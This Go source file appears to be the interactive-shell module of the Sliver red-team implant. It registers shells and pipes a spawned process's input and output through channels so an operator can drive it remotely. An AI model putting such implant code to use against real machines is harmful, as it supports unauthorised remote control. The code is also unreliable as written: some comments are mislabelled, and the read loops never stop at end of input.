package shell

import (
	"io"
	"os"
	"os/exec"
	"sync"

	pb "sliver/protobuf/sliver"
)

const (
	readBufSize = 128
)

var (
	// Shells - Access shells and channels
	Shells = shells{
		shells: &map[uint32]*Shell{},
		mutex:  &sync.RWMutex{},
	}

	shellID = new(uint32)
)

// Shell - Holds channels for a single shell
type Shell struct {
	ID   uint32
	Path string
	Send chan []byte
	Recv chan []byte
}

// Shells - Holds channels for all shells
type shells struct {
	shells *map[uint32]*Shell
	mutex  *sync.RWMutex
}

// AddShell - Add a shell to shells
func (s *shells) AddShell(shell *Shell) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	(*s.shells)[shell.ID] = shell
}

// CloseShell - Add a shell to shells
func (s *shells) CloseShell(ID uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if shell, ok := (*s.shells)[ID]; ok {
		close(shell.Recv)
		delete((*s.shells), ID)
	}
}

// RemoveShell - Add a shell to shells
func (s *shells) WriteData(shellData *pb.ShellData) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if shell, ok := (*s.shells)[shellData.ID]; ok {
		shell.Recv <- shellData.Stdin
	}
}

// GetShellID - Returns an incremental nonce as an id
func GetShellID() uint32 {
	newID := (*shellID) + 1
	(*shellID)++
	return newID
}

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	return cmd.Start()
}

// StartInteractive - Start a shell
func StartInteractive(command string, send chan []byte, recv chan []byte) *Shell {
	var cmd *exec.Cmd
	cmd = exec.Command(command)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	go func() {
		buf := make([]byte, readBufSize)
		for {
			n, err := stderr.Read(buf)
			if err != io.EOF {
				send <- buf[:n]
			}
		}
	}()

	go func() {
		buf := make([]byte, readBufSize)
		for {
			n, err := stdout.Read(buf)
			if err != io.EOF {
				send <- buf[:n]
			}
		}
	}()
	go func() {
		defer func() {
			stdin.Close()
			stdout.Close()
			stderr.Close()
			close(send)
		}()
		for incoming := range recv {
			stdin.Write(incoming)
		}
	}()
	cmd.Run()

	return &Shell{
		ID:   GetShellID(),
		Path: command,
		Send: send,
		Recv: recv,
	}
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
